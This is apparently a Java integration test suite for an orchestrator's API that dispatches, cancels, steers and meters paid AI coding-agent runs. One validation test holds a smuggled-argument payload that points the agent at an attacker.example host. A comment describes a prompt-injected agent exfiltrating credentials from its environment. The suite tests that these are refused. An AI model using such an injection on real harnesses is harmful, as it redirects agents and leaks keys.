package dev.codespire.orchestrator.factory;

import dev.codespire.contract.command.RunCommand;
import dev.codespire.contract.review.TokenType;
import dev.codespire.orchestrator.caps.CapPolicy;
import dev.codespire.orchestrator.caps.SpendWindow;
import dev.codespire.orchestrator.llm.ChargeCall;
import dev.codespire.orchestrator.llm.ChargeKind;
import dev.codespire.orchestrator.llm.ChargeLine;
import dev.codespire.orchestrator.llm.LlmProviderInput;
import dev.codespire.orchestrator.llm.LlmProviderRegistry;
import dev.codespire.orchestrator.pipeline.BrokerAckFailure;
import dev.codespire.orchestrator.provider.ProviderInput;
import dev.codespire.orchestrator.provider.ProviderRegistry;
import dev.codespire.orchestrator.readmodel.ReviewProjection;
import dev.codespire.orchestrator.settings.AppSettingRepository;
import io.quarkus.test.junit.QuarkusMock;
import io.quarkus.test.junit.QuarkusTest;
import io.quarkus.test.security.TestSecurity;
import jakarta.inject.Inject;
import org.junit.jupiter.api.Test;

import javax.sql.DataSource;
import java.sql.Connection;
import java.sql.SQLException;
import java.sql.Statement;
import java.time.Instant;
import java.util.List;
import java.util.UUID;

import static io.restassured.RestAssured.given;
import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.equalTo;
import static org.hamcrest.Matchers.nullValue;
import static org.hamcrest.Matchers.startsWith;

@QuarkusTest
class RunResourceTest {

    @Inject
    ProviderRegistry providers;

    @Inject
    FactoryRunProjection projection;

    /** The JSON form of a value, so a fixture replace is anchored to something that exists. */
    private static String quoted(String value) {
        return '"' + value + '"';
    }

    private static String body(String workspace) {
        return bodyWithModel(workspace, MODEL);
    }

    /**
     * A dispatch request naming its model explicitly.
     *
     * <p>The model used to be an arbitrary uncatalogued name, which was fine while nothing read
     * it at dispatch. It is now the catalogued one, because a run whose model cannot be priced is
     * refused before it spends -- so a fixture naming an unknown model would make every dispatch
     * test assert the refusal rather than the path it was written for.
     */
    private static String bodyWithModel(String workspace, String model) {
        return """
                {"workspace":"%s","slug":"app","providerType":"github",
                 "baseCommit":"0123456789abcdef0123456789abcdef01234567","prompt":"fix the typo",
                 "harness":"codex","model":"%s"}
                """.formatted(workspace, model);
    }

    @Inject
    DataSource dataSource;

    /** Obviously synthetic, and not the repo-wide TEST-MODEL: priceability lives in a shared table. */
    private static final String MODEL = "TEST-RUN-MODEL";

    private void sql(String statement) {
        try (Connection c = dataSource.getConnection(); Statement s = c.createStatement()) {
            s.executeUpdate(statement);
        } catch (SQLException e) {
            throw new IllegalStateException("setup failed: " + statement, e);
        }
    }

    @Inject
    LlmProviderRegistry llmProviders;

    /**
     * A default LLM provider — the harness credential's source. Created through the registry so the
     * key is encrypted the way a real one is (a raw INSERT of a plaintext key does not read back:
     * resolution decrypts). The catalog row is what the registry's priceability guard requires.
     */
    private UUID defaultLlmProvider() {
        sql("DELETE FROM llm_provider WHERE name = 'TEST-run-llm'");
        sql("DELETE FROM llm_model WHERE name = '" + MODEL + "'");
        sql("INSERT INTO llm_model (id, type, name, label, pricing_mode) VALUES ('" + UUID.randomUUID()
                + "', 'openai', '" + MODEL + "', '" + MODEL + "', 'UNMETERED')");
        return UUID.fromString(llmProviders.create(new LlmProviderInput("TEST-run-llm", "openai", "https://api.openai.com",
                "TEST-harness-key", MODEL, null, null, true, true)).id());
    }

    /**
     * A pool member, because a run no longer borrows the reviewer's key and there is no fallback.
     *
     * <p>Added through the pool so the key is Tink-encrypted the way a real one is: a raw INSERT of
     * a plaintext key does not read back, because selection decrypts.
     */
    private void aHarnessCredential() {
        // Deliberately NOT cleaned between tests: a member a run row points at cannot be deleted,
        // and that FK is the schema keeping a finished run's attribution from disappearing with the
        // key. Each call adds its own uniquely-labelled member instead, which also means the pool
        // grows across this suite and the rotation is exercised rather than assumed.
        pool.add("TEST-pool-" + UUID.randomUUID(), "openai", "https://api.openai.com", "TEST-agent-key");
    }

    @Inject
    HarnessCredentialPool pool;

    private String workspaceWithFactoryAccount() {
        defaultLlmProvider();
        aHarnessCredential();
        String workspace = "TEST-ws-" + UUID.randomUUID().toString().substring(0, 8);
        providers.create(new ProviderInput("factory-bot", "github", "https://api.github.com", workspace,
                "bearer", null, "TEST-factory-token", "", true, List.of(), "factory-bot", null, "FACTORY"));
        return workspace;
    }

    /** A run row this suite owns, written straight to the projection rather than dispatched. */
    private String registeredRun() {
        String runId = "run::github:TEST-acme/app:transcript-" + UUID.randomUUID() + ":1";
        projection.queued(new FactoryRunProjection.QueuedRun(runId, "codex", MODEL, "main",
                "abc1234", "spire/x", "spire-bot", null));
        return runId;
    }

    /**
     * There is no safe default for this decision, so a body without it is refused (FR-F10).
     *
     * <p>The two answers do opposite things — one allows the run to be started again, the other
     * forbids it — so guessing either way is how a duplicate paid run happens, or how a run that
     * never started is abandoned. A 400 asking the question is the honest answer.
     */
    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aDispatchResolutionWithoutAnAnswerIsRefused() {
        String runId = registeredRun();
        projection.dispatchUncertain(runId, "TEST-no ack");

        given().contentType("application/json").body("{}")
                .when().post("/api/runs/" + runId + "/dispatch-resolution")
                .then().statusCode(400).body(containsString("neverRan"));
    }

    /**
     * The only live state that had no stop lever, which is the state whose whole premise is that a
     * paid agent may be executing right now.
     *
     * <p>A {@code queued} run — where nothing can possibly be running yet — accepted a cancel, and
     * this one did not. A control record for a run nobody is executing is passed over quietly by
     * every replica, so allowing it costs nothing and refusing it removed the only lever on live
     * spend.
     */
    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void anUnresolvedDispatchCanStillBeCancelled() {
        String runId = registeredRun();
        projection.dispatchUncertain(runId, "TEST-no ack");

        // The negative half lives in aFinishedRunRefusesControlRatherThanAcceptingItSilently, so
        // this widening cannot be satisfied by making requireLive accept everything.
        given().contentType("application/json").body("{\"reason\":\"TEST-stop the maybe-run\"}")
                .when().post("/api/runs/" + runId + "/cancel")
                .then().statusCode(202);
    }


    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aRunThatIsNotUncertainCannotBeResolved() {
        // A run whose result arrived resolved itself, and an operator on a stale page must not be
        // able to overwrite what the run has since said.
        String runId = registeredRun();

        given().contentType("application/json").body("{\"neverRan\":true}")
                .when().post("/api/runs/" + runId + "/dispatch-resolution")
                .then().statusCode(409).body(containsString("not awaiting a dispatch resolution"));
    }

    /**
     * The other answer, over HTTP. The projection covers both, but only {@code true} reached the
     * endpoint — and the two take different code paths through it now that they are separate methods.
     */
    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void anOperatorCanResolveOverHttpThatTheRunDidStart() {
        String runId = registeredRun();
        projection.dispatchUncertain(runId, "TEST-no ack");

        given().contentType("application/json").body("{\"neverRan\":false}")
                .when().post("/api/runs/" + runId + "/dispatch-resolution")
                .then().statusCode(204);

        given().when().get("/api/runs/" + runId)
                .then().statusCode(200)
                .body("status", equalTo(FactoryRunProjection.FAILED))
                .body("failureCause", equalTo("DISPATCH_UNCERTAIN"));
    }

    /**
     * "Not dismissable" is stated in three places and enforced in two, and was asserted by nothing.
     *
     * <p>Acknowledging must not clear this row: it describes a run that may be executing right now,
     * so silencing it would leave that untracked. Only resolving the dispatch — or the run's own
     * result — takes it away.
     */
    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void acknowledgingDoesNotSilenceAnUnresolvedDispatch() {
        String runId = registeredRun();
        projection.dispatchUncertain(runId, "TEST-no ack");

        given().when().post("/api/runs/" + runId + "/attention-ack")
                .then().statusCode(204);

        given().when().get("/api/attention")
                .then().statusCode(200)
                .body("find { it.subject == '" + runId + "' }.code",
                        equalTo("RUN_DISPATCH_UNCERTAIN"));
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void resolvingAnUnknownRunIsNotFound() {
        given().contentType("application/json").body("{\"neverRan\":true}")
                .when().post("/api/runs/run::github:TEST-acme/app:never-registered:1/dispatch-resolution")
                .then().statusCode(404);
    }

    @Test
    @TestSecurity(user = "viewer", roles = "spire-viewer")
    void aViewerMayNotResolveADispatch() {
        // It decides whether a paid run is started again, so it is admin by ADR-022's first rule.
        given().contentType("application/json").body("{\"neverRan\":true}")
                .when().post("/api/runs/run::github:TEST-acme/app:any:1/dispatch-resolution")
                .then().statusCode(403);
    }

    /**
     * The producer the control listener shipped without.
     *
     * <p>Nothing in the repository published to {@code cs.run-control}, so cancel and steer were
     * reachable only by hand-producing to the topic — a consumer delivered for an operator control an
     * operator could not use, and the plan's own Task 7 file list named this endpoint.
     */
    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aRunningRunAcceptsACancel() {
        String runId = registeredRun();

        given().contentType("application/json").body("{\"reason\":\"TEST-cancel\"}")
                .when().post("/api/runs/" + runId + "/cancel")
                .then().statusCode(202);
    }

    /**
     * The refusal an operator can actually see, and the reason it lives here rather than in the
     * worker.
     *
     * <p>Every replica reads every control record, so a listener cannot tell "not running on me" from
     * "not running anywhere" and has to pass over both quietly. This endpoint reads the row, so it
     * can say which — synchronously, instead of leaving an operator watching a timeline that will
     * never change.
     */
    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aFinishedRunRefusesControlRatherThanAcceptingItSilently() {
        String runId = registeredRun();
        projection.apply(new dev.codespire.contract.event.RunResult.RunFinished(
                runId, "refs/heads/spire/x", List.of("a.txt"), List.of(), null, false));

        given().contentType("application/json").body("{\"reason\":\"TEST-cancel\"}")
                .when().post("/api/runs/" + runId + "/cancel")
                .then().statusCode(409).body(containsString("cannot be cancelled"));
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void controlForAnUnknownRunIsNotFound() {
        given().contentType("application/json").body("{\"reason\":\"TEST-cancel\"}")
                .when().post("/api/runs/run::github:TEST-acme/app:never-registered:1/cancel")
                .then().statusCode(404);
    }

    /**
     * A blank instruction is refused where the caller can read the reason.
     *
     * <p>{@code SteerRun}'s own constructor bounds it, but over Kafka those guards fire inside the
     * worker's deserializer, which answers null and drops the record — so the operator would be told
     * nothing at all. Building the command here turns that into a 400.
     */
    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aBlankInstructionIsRefusedAtTheEdge() {
        String runId = registeredRun();

        given().contentType("application/json").body("{\"instruction\":\"\"}")
                .when().post("/api/runs/" + runId + "/steer")
                .then().statusCode(400);
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aRunningRunAcceptsASteer() {
        String runId = registeredRun();

        given().contentType("application/json").body("{\"instruction\":\"prefer the smaller change\"}")
                .when().post("/api/runs/" + runId + "/steer")
                .then().statusCode(202);
    }

    @Test
    @TestSecurity(user = "viewer", roles = "spire-viewer")
    void aViewerMayNotStopARun() {
        // Control is admin, by ADR-022's first rule: a steer directs a credentialed agent and costs
        // model calls, and a cancel ends work someone else started.
        given().contentType("application/json").body("{\"reason\":\"TEST-cancel\"}")
                .when().post("/api/runs/run::github:TEST-acme/app:any:1/cancel")
                .then().statusCode(403);
    }

    @Test
    @TestSecurity(user = "viewer", roles = "spire-viewer")
    void aViewersTranscriptRequestIsNotSwallowedByTheRunDetailRoute() {
        // The detail route's path regex is greedy (.+), so it can match a run id WITH /transcript
        // still attached and answer "no such run: .../transcript". JAX-RS ranks candidates by
        // literal character count and should prefer the transcript route — but "should" is not a
        // property to rest a route on, and the failure is a 404 that reads like a missing run.
        String runId = registeredRun();

        given().when().get("/api/runs/" + runId + "/transcript")
                .then().statusCode(200);

        // ...and the detail route still answers for the id alone.
        given().when().get("/api/runs/" + runId)
                .then().statusCode(200);
    }

    @Test
    @TestSecurity(user = "viewer", roles = "spire-viewer")
    void aTranscriptOfAnUnknownRunIsNotFound() {
        // Rather than an empty page, which reads as "this run produced nothing" for a run that does
        // not exist at all — two different answers an operator acts on differently.
        given().when().get("/api/runs/run::github:TEST-acme/app:never-registered:1/transcript")
                .then().statusCode(404);
    }

    /**
     * The harness key comes from the pool, and there is no fallback to the reviewer's (FR-F12).
     *
     * <p>This replaces a test asserting the opposite rule. A run used to take the deployment's
     * DEFAULT LLM provider key when none was named — the same key the review pipeline calls the
     * model with — and hand it to a container running an untrusted model on an untrusted work item
     * at full shell access, where a prompt-injected agent can read its own environment. One
     * exfiltration disabled reviews and runs together.
     *
     * <p>So an empty pool is a refusal naming what to configure, which is the same call the push
     * identity already makes: the factory never borrows the reviewer's identity, in either
     * direction.
     */
    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void theHarnessCredentialComesFromThePoolNeverTheReviewersKey() {
        String workspace = workspaceWithFactoryAccount();
        // Scoped to this suite's own fixtures: the database is shared with every other suite, and
        // an unqualified UPDATE here decided their outcomes by test ordering. Members are disabled
        // rather than deleted, because a run row referencing one holds it by foreign key -- which
        // is the schema keeping a finished run's attribution from vanishing with the key.
        sql("UPDATE harness_credential SET enabled = FALSE WHERE label LIKE 'TEST-pool-%'");

        // A perfectly good default LLM provider exists -- and is deliberately NOT used.
        given().contentType("application/json").body(body(workspace))
                .when().post("/api/runs")
                .then().statusCode(409)
                .body(containsString("harness credential"))
                .body(containsString("reviewer"));

        aHarnessCredential();
        given().contentType("application/json").body(body(workspace))
                .when().post("/api/runs")
                .then().statusCode(201);
    }

    /**
     * A request that tries to pin the key is refused rather than quietly overruled.
     *
     * <p>{@code llmProviderId} used to choose the credential. The pool rotates now, so honouring a
     * pin would defeat the rotation that exists to survive exhaustion — and ignoring the field
     * silently would leave the caller believing they had pinned a key.
     */
    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aRequestCannotPinTheHarnessCredential() {
        String workspace = workspaceWithFactoryAccount();
        UUID id = defaultLlmProvider();

        given().contentType("application/json")
                .body(body(workspace).replace("\"harness\"", "\"llmProviderId\":\"" + id + "\",\"harness\""))
                .when().post("/api/runs")
                .then().statusCode(400)
                .body(containsString("no longer accepted"));
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void dispatchingReturnsADerivedRunId() {
        String workspace = workspaceWithFactoryAccount();

        String runId = given().contentType("application/json").body(body(workspace))
                .when().post("/api/runs")
                .then().statusCode(201)
                .body("runId", startsWith("run::github:" + workspace + "/app:"))
                .extract().path("runId");

        // Recorded before dispatch, so the run exists in the read model the moment 201 is answered.
        given().when().get("/api/runs/" + runId)
                .then().statusCode(200)
                .body("status", org.hamcrest.Matchers.equalTo(FactoryRunProjection.QUEUED));
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void dispatchingAQueuedSubjectAgainIsRefusedNotSilentlyDropped() {
        // The worker's claim drops a second ExecuteRun as a redelivery, so answering 201 to a repeat
        // would promise a run that never starts. The earlier version overwrote the row and answered
        // 201 anyway; now the row is written only when absent or re-armable, and a repeat is a 409
        // that names the run and its status.
        String workspace = workspaceWithFactoryAccount();
        String request = body(workspace).replace("\"harness\"", "\"subject\":\"twice\",\"harness\"");

        given().contentType("application/json").body(request)
                .when().post("/api/runs")
                .then().statusCode(201);
        given().contentType("application/json").body(request)
                .when().post("/api/runs")
                .then().statusCode(409)
                .body(containsString("run::github:" + workspace + "/app:twice:1"))
                .body(containsString(FactoryRunProjection.QUEUED));
    }

    @Inject
    AppSettingRepository settings;

    @Inject
    SpendWindow spendWindow;

    @Inject
    CapPolicy capPolicy;

    @Inject
    ReviewProjection reviews;

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aRunIsRefusedUnderTheDeploymentsSpendCapAndLeavesNoRow() {
        // A run is a paid model call and V42 counts its spend in the same rolling window as reviews,
        // so the ADR-025 gate must refuse it too — before the queued row, so a refusal is not a run
        // the operator then has to explain. The cap is set to what the shared ledger already holds
        // plus the one call seeded here, because a stored "0" reads as UNSET by design (it would stop
        // a deployment forever). Cleared in finally so the cap cannot leak into the other tests.
        String workspace = workspaceWithFactoryAccount();
        String request = body(workspace).replace("\"harness\"", "\"subject\":\"capped\",\"harness\"");
        SpendWindow.Usage baseline = spendWindow.since(Instant.now().minus(capPolicy.window()))
                .orElseThrow(() -> new AssertionError("the ledger read failed"));
        reviews.recordCharges(ChargeCall.forReview("TEST-run-cap-" + workspace, "CANARY-RUN-CAP-" + workspace,
                ChargeKind.REVIEW, MODEL, List.of(ChargeLine.unmetered(TokenType.INPUT, 1_000))));
        settings.set(CapPolicy.KEY_CALLS, String.valueOf(baseline.calls() + 1));
        try {
            given().contentType("application/json").body(request)
                    .when().post("/api/runs")
                    .then().statusCode(429)
                    .body(containsString("call cap reached"));
            given().when().get("/api/runs/run::github:" + workspace + "/app:capped:1")
                    .then().statusCode(404);
        } finally {
            settings.set(CapPolicy.KEY_CALLS, "");
        }
        given().contentType("application/json").body(request)
                .when().post("/api/runs")
                .then().statusCode(201);
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aNestedGitLabNamespaceIsDispatchable() {
        // GitLab nests groups, so a workspace is `group/subgroup`; RunIds splits on the LAST slash.
        // Validating the whole workspace as one segment refused every nested namespace at the door
        // while the GET route's own comment said they were supported.
        defaultLlmProvider();
        String workspace = "TEST-grp-" + UUID.randomUUID().toString().substring(0, 8) + "/team";
        providers.create(new ProviderInput("factory-bot", "gitlab", "https://gitlab.com", workspace,
                "bearer", null, "TEST-factory-token", "", true, List.of(), "factory-bot", null, "FACTORY"));
        String request = body(workspace).replace("\"providerType\":\"github\"", "\"providerType\":\"gitlab\"");

        given().contentType("application/json").body(request)
                .when().post("/api/runs")
                .then().statusCode(201)
                .body("runId", startsWith("run::gitlab:" + workspace + "/app:"));

        // Still one segment per part: a leading, trailing or empty segment is refused.
        for (String bad : List.of("/grp", "grp/", "grp//team", "grp/../team")) {
            given().contentType("application/json")
                    .body(request.replace("\"workspace\":\"" + workspace + "\"", "\"workspace\":\"" + bad + "\""))
                    .when().post("/api/runs")
                    .then().statusCode(400);
        }
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aWorkspaceWithNoFactoryAccountIsRefusedNotPushedAsTheReviewer() {
        // 409, naming what is missing. The alternative — falling back to the reviewer's credential —
        // produces a branch the reviewer's own author allowlist skips: work nobody reviews and
        // nobody is told about.
        String workspace = "TEST-rev-" + UUID.randomUUID().toString().substring(0, 8);
        providers.create(new ProviderInput("reviewer-bot", "github", "https://api.github.com", workspace,
                "bearer", null, "TEST-reviewer-token", "", true, List.of(), "reviewer-bot", null));

        given().contentType("application/json").body(body(workspace))
                .when().post("/api/runs")
                .then().statusCode(409)
                .body(containsString("FACTORY"));
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aDispatchTheBrokerRefusedOutrightIsFailedAndARetryReArmsIt() {
        // The certain half of FR-F10. A rejection the client calls non-retriable was decided before
        // anything reached a partition, so the run definitely did not start: the row is neither
        // deleted (a run possibly on the bus with no record — the very thing writing it first
        // prevents) nor left as a queued run nobody will ever start. It is marked re-armable, and
        // the same request starts it.
        String workspace = workspaceWithFactoryAccount();
        String request = body(workspace).replace("\"harness\"", "\"subject\":\"retry-me\",\"harness\"");
        String runId = "run::github:" + workspace + "/app:retry-me:1";

        QuarkusMock.installMockForType(new RunCommandEmitter() {
            @Override
            public void dispatch(RunCommand command) {
                // Non-retriable, so the client is telling us the record never left. This is the
                // ONLY shape that may re-arm: everything else has to fail closed.
                throw BrokerAckFailure.rejected("run command ExecuteRun",
                        new org.apache.kafka.common.errors.RecordTooLargeException("too big"));
            }
        }, RunCommandEmitter.class);

        given().contentType("application/json").body(request)
                .when().post("/api/runs")
                .then().statusCode(503)
                .body(containsString("re-arms"));
        // The stored detail is a fixed sentence: the row is viewer-readable, and the broker's own
        // message names hosts and internals. That text reaches the admin's 503 and the log only.
        given().when().get("/api/runs/" + runId)
                .then().statusCode(200)
                .body("status", equalTo(FactoryRunProjection.FAILED))
                .body("failureCause", equalTo(FactoryRunProjection.DISPATCH_FAILED))
                .body("failureDetail", equalTo(RunResource.DISPATCH_FAILED_DETAIL));

        QuarkusMock.installMockForType(new RunCommandEmitter() {
            @Override
            public void dispatch(RunCommand command) {
                // the broker is back
            }
        }, RunCommandEmitter.class);

        given().contentType("application/json").body(request)
                .when().post("/api/runs")
                .then().statusCode(201);
        given().when().get("/api/runs/" + runId)
                .then().statusCode(200)
                .body("status", equalTo(FactoryRunProjection.QUEUED))
                .body("failureCause", nullValue());
    }

    /**
     * The uncertain half, and the one that decides money (FR-F10).
     *
     * <p>An acknowledgement that never arrives says nothing about the record: the producer may
     * still be retrying and the append may already have happened. Recording that as a definite
     * failure — which is what this path did — makes the row re-armable, so an operator's identical
     * retry publishes a second command and, if the first landed after all, a second agent works the
     * same branch with the model paid twice.
     */
    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aDispatchTheBrokerNeverAcknowledgedIsUncertainAndIsNotRetried() {
        String workspace = workspaceWithFactoryAccount();
        String request = body(workspace).replace("\"harness\"", "\"subject\":\"maybe-sent\",\"harness\"");
        String runId = "run::github:" + workspace + "/app:maybe-sent:1";

        QuarkusMock.installMockForType(new RunCommandEmitter() {
            @Override
            public void dispatch(RunCommand command) {
                throw BrokerAckFailure.notAcknowledged("No broker ack within 10s", null);
            }
        }, RunCommandEmitter.class);

        given().contentType("application/json").body(request)
                .when().post("/api/runs")
                .then().statusCode(503)
                .body(containsString("NOT retried automatically"));
        given().when().get("/api/runs/" + runId)
                .then().statusCode(200)
                .body("status", equalTo(FactoryRunProjection.DISPATCH_UNCERTAIN))
                .body("failureDetail", equalTo(RunResource.uncertainDetail(runId)));

        // The broker is back, and the retry is STILL refused -- this is the fail-closed rule. The
        // certain case above is 201 at exactly this point, which is what makes the two differ.
        QuarkusMock.installMockForType(new RunCommandEmitter() {
            @Override
            public void dispatch(RunCommand command) {
                throw new AssertionError("an uncertain run must not be published again");
            }
        }, RunCommandEmitter.class);

        given().contentType("application/json").body(request)
                .when().post("/api/runs")
                .then().statusCode(409)
                .body(containsString("dispatch-resolution"));

        // ...until an operator resolves it, after which the ordinary retry path works again.
        given().contentType("application/json").body("{\"neverRan\":true}")
                .when().post("/api/runs/" + runId + "/dispatch-resolution")
                .then().statusCode(204);

        QuarkusMock.installMockForType(new RunCommandEmitter() {
            @Override
            public void dispatch(RunCommand command) {
                // the broker is back
            }
        }, RunCommandEmitter.class);

        given().contentType("application/json").body(request)
                .when().post("/api/runs")
                .then().statusCode(201);
    }

    /**
     * A publish fault this code cannot classify is treated as ambiguous, not as a definite failure.
     *
     * <p>Narrowing the catch to the classified type was a regression found by an existing test: any
     * other fault escaped as a 500 with the row left {@code queued}, so a run nobody would ever
     * start sat looking as though it were about to. Failing closed is also the safer reading — a
     * fault we cannot read tells us nothing about whether the record left.
     */
    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void anUnclassifiedPublishFaultFailsClosedRatherThanEscaping() {
        String workspace = workspaceWithFactoryAccount();
        String request = body(workspace).replace("\"harness\"", "\"subject\":\"odd-fault\",\"harness\"");
        String runId = "run::github:" + workspace + "/app:odd-fault:1";

        QuarkusMock.installMockForType(new RunCommandEmitter() {
            @Override
            public void dispatch(RunCommand command) {
                throw new IllegalStateException("something the ack helper did not classify");
            }
        }, RunCommandEmitter.class);

        given().contentType("application/json").body(request)
                .when().post("/api/runs")
                .then().statusCode(503);
        given().when().get("/api/runs/" + runId)
                .then().statusCode(200)
                .body("status", equalTo(FactoryRunProjection.DISPATCH_UNCERTAIN));
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aHarnessWithNoConfiguredImageIsRefusedBeforeAnythingIsRecorded() {
        // The orchestrator never names an arm; it reads spire.factory.agent-image.<harness>. A name
        // with no image is a 400 that names the configured ones — and leaves no queued row behind.
        String workspace = workspaceWithFactoryAccount();
        String request = body(workspace).replace("\"harness\":\"codex\"",
                "\"subject\":\"no-such-arm\",\"harness\":\"opencode\"");

        given().contentType("application/json").body(request)
                .when().post("/api/runs")
                .then().statusCode(400)
                .body(containsString("opencode"))
                .body(containsString("codex"));
        given().when().get("/api/runs/run::github:" + workspace + "/app:no-such-arm:1")
                .then().statusCode(404);
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aBaseBranchEqualToTheRunsOwnBranchIsRefusedBeforeTheAgentIsPaid() {
        // The publisher refuses branch == base at startup — after the agent has run. Operators
        // iterating on a previous factory branch as the base reach this without a typo.
        String workspace = workspaceWithFactoryAccount();
        String request = body(workspace).replace("\"harness\"",
                "\"subject\":\"again\",\"baseBranch\":\"spire/again\",\"harness\"");

        given().contentType("application/json").body(request)
                .when().post("/api/runs")
                .then().statusCode(400)
                .body(containsString("spire/again"));
        given().when().get("/api/runs/run::github:" + workspace + "/app:again:1")
                .then().statusCode(404);
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aSubjectGitWouldRefuseAsABranchIsRefusedHere() {
        String workspace = workspaceWithFactoryAccount();
        for (String bad : List.of("a..b", "x.lock", "has/slash", "-leading")) {
            String request = body(workspace).replace("\"harness\"", "\"subject\":\"" + bad + "\",\"harness\"");
            given().contentType("application/json").body(request)
                    .when().post("/api/runs")
                    .then().statusCode(400);
        }
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void anUnboundedOrFlagShapedInputIsRefusedAtTheDoor() {
        // prompt: rides every command copy and the DLQ row. model: reaches the harness argv as
        // `--model <value>`. baseBranch: the publisher clones it, so git's own refusals are applied
        // here rather than by an init container that fails after the row is written.
        String workspace = workspaceWithFactoryAccount();
        String ok = body(workspace);

        given().contentType("application/json")
                .body(ok.replace("\"fix the typo\"", "\"" + "x".repeat(64 * 1024 + 1) + "\""))
                .when().post("/api/runs").then().statusCode(400).body(containsString("prompt"));
        given().contentType("application/json")
                .body(ok.replace(quoted(MODEL), "\"-c model_providers.openai.base_url=http://attacker.example/v1\""))
                .when().post("/api/runs").then().statusCode(400).body(containsString("model"));
        for (String bad : List.of("..main", "/main", "main/", "a//b", "feature/.hidden", "-x", "x.lock", "a b")) {
            given().contentType("application/json")
                    .body(ok.replace("\"harness\"", "\"baseBranch\":\"" + bad + "\",\"harness\""))
                    .when().post("/api/runs").then().statusCode(400).body(containsString("baseBranch"));
        }
        // A nested, dotted branch name git accepts is accepted here too.
        given().contentType("application/json")
                .body(ok.replace("\"harness\"", "\"subject\":\"nested-base\",\"baseBranch\":\"release/1.2\",\"harness\""))
                .when().post("/api/runs").then().statusCode(201);
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aFactoryAccountWithNoResolvedLoginIsRefusedBeforeAnyRowExists() {
        // The registry stores a blank login as null. Packing a null login threw AFTER the queued
        // row was written: a 500, and a subject the 409-on-existing-row guard then refused for ever.
        defaultLlmProvider();
        String workspace = "TEST-nologin-" + UUID.randomUUID().toString().substring(0, 8);
        providers.create(new ProviderInput("factory-bot", "github", "https://api.github.com", workspace,
                "bearer", null, "TEST-factory-token", "", true, List.of(), "", null, "FACTORY"));
        String request = body(workspace).replace("\"harness\"", "\"subject\":\"no-login\",\"harness\"");

        given().contentType("application/json").body(request)
                .when().post("/api/runs")
                .then().statusCode(409)
                .body(containsString("login"));
        given().when().get("/api/runs/run::github:" + workspace + "/app:no-login:1")
                .then().statusCode(404);
    }

    @Test
    @TestSecurity(user = "viewer", roles = "spire-viewer")
    void aViewerCannotSpendMoney() {
        given().contentType("application/json").body(body("acme"))
                .when().post("/api/runs")
                .then().statusCode(403);
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aMalformedRequestIsRefusedBeforeAnythingIsRecorded() {
        given().contentType("application/json")
                .body("""
                        {"workspace":"../etc","slug":"app","providerType":"github",
                         "baseCommit":"not-hex","prompt":"x","harness":"codex","model":"m"}
                        """)
                .when().post("/api/runs")
                .then().statusCode(400);

        given().contentType("application/json")
                .body("""
                        {"workspace":"acme","slug":"app","providerType":"mercurial",
                         "baseCommit":"abc1234","prompt":"x","harness":"codex","model":"m"}
                        """)
                .when().post("/api/runs")
                .then().statusCode(400);
    }

    @Test
    void anAnonymousCallerIsRefused() {
        given().contentType("application/json").body(body("acme"))
                .when().post("/api/runs")
                .then().statusCode(401);
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aRunOnAnUnpriceableModelIsRefusedBeforeItSpends() {
        // The half that protects the cap rather than reporting on it. Pricing is post-hoc -- the
        // charge is written when the run is already over -- so dispatch is the last point at which
        // an unpriceable run can still be refused rather than merely noticed afterwards.
        //
        // Leaving it out is worse than it looks: every charge for such a run is recorded UNKNOWN,
        // whose cost is NULL, and SUM() skips NULL. So the money cap would be reading a total that
        // omits precisely the runs it could not price.
        String workspace = workspaceWithFactoryAccount();
        String uncatalogued = "TEST-MODEL-WITH-NO-RATES-" + UUID.randomUUID();

        given().contentType("application/json").body(bodyWithModel(workspace, uncatalogued))
                .when().post("/api/runs")
                .then().statusCode(409)
                .body(containsString("no usable pricing"));
    }

    @Test
    @TestSecurity(user = "op", roles = "spire-admin")
    void aPriceableModelStillDispatches() {
        // The other half. Without it the refusal could be unconditional and every test above would
        // still pass, because they assert their own paths rather than this gate.
        String workspace = workspaceWithFactoryAccount();

        given().contentType("application/json").body(body(workspace))
                .when().post("/api/runs")
                .then().statusCode(201);
    }
}
